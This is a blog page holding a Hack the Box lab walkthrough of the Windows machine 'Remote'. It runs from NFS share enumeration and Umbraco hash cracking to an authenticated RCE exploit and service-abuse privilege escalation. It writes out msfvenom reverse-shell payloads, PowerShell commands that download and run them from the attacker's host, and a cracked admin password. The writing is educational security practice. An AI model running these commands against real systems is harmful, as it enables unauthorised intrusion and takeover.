@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en" dir=>
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Remote was a very cool windows box that required us to discover a vulnerability in their CMS, after discovering an exposed file system that contained a backup. Once on the machine we can find out that there are some misconfigured privileges.">
+<meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="Remote" />
+<meta property="og:description" content="Remote was a very cool windows box that required us to discover a vulnerability in their CMS, after discovering an exposed file system that contained a backup. Once on the machine we can find out that there are some misconfigured privileges." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://stefantobler.com/posts/hack-the-box/remote/" />
+<meta property="article:published_time" content="2020-07-05T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-07-05T00:00:00+00:00" />
+<title>Remote | Stefan Tobler</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.6cd8553a6854f4812343f0f0c8baca31271e686434f381fbe3c7226f66639176.css" integrity="sha256-bNhVOmhU9IEjQ/DwyLrKMSceaGQ084H748cib2ZjkXY=">
+<script defer src="/en.search.min.ab9d929297a6ceaaee12dbc25d223bb539ea2d8e1aec6db2a704529b25d561bf.js" integrity="sha256-q52SkpemzqruEtvCXSI7tTnqLY4a7G2ypwRSmyXVYb8="></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-158607018-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+  
+<link rel="stylesheet" href="/assets/css/posts.css" />
+
+</head>
+
+<body dir=>
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="/"><img src="/images/logo.png" alt="Logo" /><span>Stefan Tobler</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+<span><a href='https://stefantobler.com/posts/'>Recent Posts</a></span>
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <span>Hack the Box</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <span>Challenges</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/challenges/fuzzy/" class="">Fuzzy</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/magic/" class="">Magic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/remote/" class="active">Remote</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/hack-the-box/traceback/" class="">Traceback</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <span>Try Hack Me</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/basic-pentesting/" class="">Basic Pentesting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/blue/" class="">Blue</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/ice/" class="">Ice</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/vulnversity/" class="">Vulnversity</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/posts/try-hack-me/shodan.io/" class="">Shodan.io</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Remote</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+
+<div class="post-hero-container">
+  <img class="card-img-top" src='/images/content/posts/hack-the-box/remote.png'/>
+</div>
+
+<article class="markdown">
+  <h1>
+    <a href="/posts/hack-the-box/remote/">Remote</a>
+  </h1>
+  
+  
+  <div>
+    
+      <a href="/categories/hack-the-box/">hack-the-box</a>
+  </div>
+  
+
+  
+  <div>
+    
+      <a href="/tags/windows/">windows</a>, 
+      <a href="/tags/privilege/">privilege</a>, 
+      <a href="/tags/umbraco/">umbraco</a>, 
+      <a href="/tags/cms/">cms</a>, 
+      <a href="/tags/rpc/">rpc</a>
+  </div>
+  
+
+
+  <p><p>Remote was a very cool windows box that required us to discover a vulnerability in their CMS, after discovering an exposed file system that contained a backup. Once on the machine we can find out that there are some misconfigured privileges. We can then abuse those permission with PowerUp.ps1 for Windows.</p>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>nmap</li>
+<li>python3</li>
+<li>rpcbind</li>
+<li>mount</li>
+<li>winPEAS</li>
+</ul>
+<h2 id="recon">
+  Recon
+  <a class="anchor" href="#recon">#</a>
+</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export IP<span style="color:#f92672">=</span>10.10.10.180
+</code></pre></div><p>First things first, we need to do a <code>nmap</code> scan with the command <code>nmap -sS -sV -oA nmap/remote $IP</code>. Here are my results.</p>
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 01:28 EDT
+Nmap scan report for 10.10.10.180
+Host is up (0.056s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+111/tcp  open  rpcbind       2-4 (RPC #100000)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+2049/tcp open  mountd        1-3 (RPC #100005)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 86.97 seconds
+</code></pre><p>Looks like there is a website being hosted on this box, so let&rsquo;s check that out. After poking around the website I found a login page that was linked to on the contact page.</p>
+<p>Login Page:</p>
+<ul>
+<li>http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms</li>
+<li>http://10.10.10.180/install</li>
+</ul>
+<p>This link also tells us something about the website. They are using <code>umbraco</code> for their CMS. If we could find the version number maybe there is some sort of exploit.</p>
+<p>After poking around the source of the login page, nothing stood out to me off the bat, so I am going to try and fuzz some directories. I am using <code>ffuf</code> to discover directories. I used the command <code>ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.php,.html,.json,.xml</code>. Interesting enough there is a directory called <code>install</code> that redirects you to the login page.</p>
+<p>Let&rsquo;s try to enumerate the <code>/umbraco/</code> directory to see if we find anything interesting.</p>
+<p>The only thing I found that I could see was a path to <code>/umbraco/application</code> after investigating this there doesn&rsquo;t seem like much. I am going to try and research some of the other services running on the machine to maybe poke around in.</p>
+<p>I am going to try scanning the <code>rpcbind</code> service with the command <code>nmap -sV --script=nfs-showmount 10.10.10.180</code> maybe there is some sort of file system that we can mount and view. Looks like there is a discoverable file system called <code>/site_backups</code>. Hmm this is interesting, maybe we can find credentials on that. Let&rsquo;s figure out how to access it. Okay so to mount the file system I used the command <code>sudo mount -t nfs 10.10.10.180:/site_backups /mnt</code>. Now we can see the contents of <code>/site_backups</code> in our <code>/mnt</code> folder. Let&rsquo;s do some exploring. After looking around it looks like this is a backup of the CMS <code>umbraco</code> so I did some googling and it looks like all the credentials are located in a database, so let&rsquo;s see if that was backed up or not. After some more searching I found <a href="https://our.umbraco.com/forum/umbraco-7/using-umbraco-7/74780-how-do-i-check-what-db-umbraco-is-using">this</a> fourm post about the database location being in <code>Umbraco/AppData/umbraco.sdf</code>. So I used the command <code>find /mnt | grep -i '.sdf'</code> and found the file. When I try and <code>cat</code> it out it is a mess and since some of the data is binary I cannot <code>grep</code> it, but I can use the command <code>strings /mnt/App_Data/umbraco.sdf</code> to see just the ascii readable characters. Then I <code>grep</code> for &lsquo;admin&rsquo; and noticed some hashes at the top. I went to <code>crackstation</code> and it turns out that the admin password is <code>baconandcheese</code>. If we try an login with the credentials <code>admin@htb.local::baconandcheese</code> we can get into the admin page.</p>
+<pre><code>Credentials:
+  - Umbraco Admin
+    admin@htb.local::baconandcheese
+</code></pre><h2 id="user">
+  User
+  <a class="anchor" href="#user">#</a>
+</h2>
+<p>I poked around the admin panel for a little bit I didn&rsquo;t find anything too interesting to me, but I did find out that this host is running <code>Umbraco version 7.12.4</code>, and it turns out there is an authenticated remote code execution exploit for this very version! What a coincidence! <a href="https://github.com/noraj/Umbraco-RCE">Here</a> is the code now we just need to craft a reverse shell for the windows machine. I used the command <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f exe &gt; reverse.exe</code> to create a reverse shell payload. Now we just need to get it on the target machine. We can start a server on our own machine using the command <code>python3 -c http.server</code>. Now we are hosting a server that our payload is on. When I use the command <code>python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command curl -UseBasicParsing -o C:\Users\Public\Documents\reverse.exe http://10.10.14.5:8000/Umbraco-RCE/reverse.exe'</code> I am getting a 200 code on my simple server, suggesting that the file has been downloaded, or at least accessed. We can check if we use the command <code>python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command Get-ChildItem -Path C:\ -Filter reverse.exe -Recurse -ErrorAction SilentlyContinue -Force'</code>. This command will find the file on the system and should return the file and it&rsquo;s read/write permissions.</p>
+<p>Now that we have our payload uploaded to the server we can start a listener on our machine using the command <code>nc -lvnp 1337</code> and run the command <code>python3 exploit.py -u 'admin@htb.local' -p 'baconandcheese' -i 'http://10.10.10.180' -c powershell.exe -a '-NoProfile -Command C:\Users\Public\Documents\reverse.exe'</code> to run the reverse shell on the machine. If we take a look at our listener we should see the shell pop up. If we take a look around we can find <code>user.txt</code> at the path <code>C:\Users\Public\user.txt</code>. You can read the file with the <code>type</code> command.</p>
+<h2 id="root">
+  Root
+  <a class="anchor" href="#root">#</a>
+</h2>
+<p>Time to look for some avenues for privilege escalation. The first thing I ran is <code>whoami /priv</code> and got the following.</p>
+<pre><code>PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled *
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled *
+SeCreateGlobalPrivilege       Create global objects                     Enabled *
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre><p>I put stars near the permissions that stood out to me. The most interesting thing to me is <code>SeImpersonatePrivilege</code>. This sounds like I should be able to impersonate the <code>ns authority</code> user.</p>
+<p>I did a <code>winPEAS</code> scan. Getting it to work on the machine was kinda tricky because something was wrong with the version I had. Anyways I got the binary from <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe">here</a>. Then I spawned a simple server on my machine and used the command <code>curl -o winPEASany.exe http://10.10.14.5:8000/winPEASany.exe</code>. Then I ran the program.</p>
+<p>Okay so now I am running another check. I am using <code>PowerUp.ps1</code> to check the system. This was a bit hard to get working, but I found a good tutorial <a href="https://recipeforroot.com/advanced-powerup-ps1-usage/">here</a>. Make sure you follow it step by step, and I got it on the server in the usual way by using a simple python server. After running it it looks like the <code>UsoSvc</code> service is vulnerable, maybe I can craft another reverse shell payload and execute it as <code>ns authority</code>.</p>
+<p>Okay here is how I did it, After discovering the <code>UsoSvc</code> I continued to read the <code>PowerUp</code> article and read that you can execute commands as a privileged user. For our instance we use the command <code>Invoke-ServiceAbuse -Name 'UsoSvc' -Command &quot;[command_here]&quot;</code>. If we upload another reverse shell to the server on another port then we can spawn a reverse shell as <code>ns authority</code>. I used the following command to craft a payload <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=1234 -f exe &gt; root_reverse.exe</code> then to get it on the server I created another simple server. Then open up a listener on port 1234. After the file is on the server run the shell using <code>Invoke-ServiceAbuse -Name 'UsoSvc' -Command &quot;C:\Users\Public oot_reverse.exe&quot;</code>. Then we can catch the shell and we are <code>ns authority</code>! The flag can be found on the admin&rsquo;s desktop. This was a pretty hard box for me. I am not that familiar with windows services, but I am glad I took on the challenge.</p>
+</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+<div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "stefantobler" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tools">Tools</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#root">Root</a></li>
+  </ul>
+</nav>
+
+ 
+    </aside>
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
